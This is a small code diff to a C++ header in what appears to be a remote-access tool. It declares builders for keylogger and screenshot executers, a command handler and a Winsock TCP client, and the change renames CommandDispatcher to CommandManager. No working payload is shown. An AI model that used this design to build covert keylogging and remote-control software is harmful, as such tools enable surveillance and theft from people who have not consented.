@@ -2,7 +2,7 @@
 
 #include "command/execute/ScreenshotExecuter.h"
 #include "command/execute/KeyloggerExecuter.h"
-#include "command/CommandDispatcher.h"
+#include "command/CommandManager.h"
 #include "networking/WinsockTCPClient.h"
 
 
@@ -17,7 +17,7 @@ namespace builders
 
     command::ICommandExecuter* BuildKeyloggerExecuter();
 
-    command::CommandDispatcher* BuildDispatcher();
+    command::CommandManager* BuildManager();
 
     networking::WinsockTCPClient* BuildClient();
 }
